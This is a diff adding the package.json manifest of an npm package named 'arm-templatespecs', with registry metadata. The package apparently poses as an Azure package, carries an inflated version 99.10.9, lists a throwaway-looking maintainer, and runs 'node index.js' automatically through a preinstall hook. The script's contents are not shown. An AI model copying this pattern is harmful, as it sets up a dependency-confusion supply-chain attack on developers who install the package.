@@ -1,0 +1,39 @@
+{
+    "name": "arm-templatespecs",
+    "version": "99.10.9",
+    "description": "azure package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo 'error no test specified' && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "arm-templatespecs@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-YqDVmqWANC4ABYeCiEMG1ZppfKMIuhgbt8WBtu2tchmMQI71rXfzuLw/5lqbV9uvNM/rsw0najv1UZpFI50dMw==",
+        "shasum": "86fd7f8f65b49ccc2ec3c775d10fb7939ecf4dc9",
+        "tarball": "https://registry.npmjs.org/arm-templatespecs/-/arm-templatespecs-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 5066,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiNatUACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmqzEQ//boWnf/2qN6D8Z1jdeTHjkuEHS30OD+WNzwlkItfRkZKAZ04p\r\nmqyF65emKIe6eG5fZdflIWFR6mnGO3HYLUbf9R71zOOdcpYMRhfaX/kUY8EL\r\niAJYQjaaoJI3o0mfFonIxYTH6T2Xj6VrFBHVXbulPcY1yVvOHOdiWhgK3RKb\r\ncU69a7S+ZWnYYlaU65CEUuSMrpuusAWiD7Qi8jlyDJbCX+1F5kFWhJHVWGOt\r\nxyhrhehTAR5HKkFB2UP6CkZ57jktB8ykPlWw974jj/4uXFcOLPg8B2HqLfd1\r\njGu5BLoYw/AdSkpw2U1bd68A1a5vhHoyhdJnTRoMSKUILTxONuiNJtUzZdUS\r\nLp0B8/7gldFik/FTKX91ktyZ3hBBF7Tp+/271dyedRlS6mrMsqq36yMn49Td\r\n/GVTJ3tbd8jKUI1W8Yl3DwJpNXRVVH7QfKpX8H7fD8hNgm+pkbl3WiV+V95c\r\nNbtpW/GPptUhZ8bMtOVpjd7cp7wdYtitjaP1IPk/evsu2Ft/NRaKXU4WjYlI\r\ns9FSDg/NYTxIC1gy2qp8sxrZ/XosI2ME8mwdiLCSIc8+sYds68HXrNCKtuQs\r\ncRmRVQea0RD4RYeJ/+QAo271CxBR3bqHsUP6A0asjSzTVxmwXnlGQUA7Ta4b\r\nue+h646TnFCSgI7KZ0v3ntsI7hDREwn+ns4=\r\n=AYLx\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "kjlj1kff",
+        "email": "kjlj1kff@rt11.ml"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "kjlj1kff",
+            "email": "kjlj1kff@rt11.ml"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/arm-templatespecs_99.10.9_1647684435959_0.4527978617679913"
+    },
+    "_hasShrinkwrap": false
+}
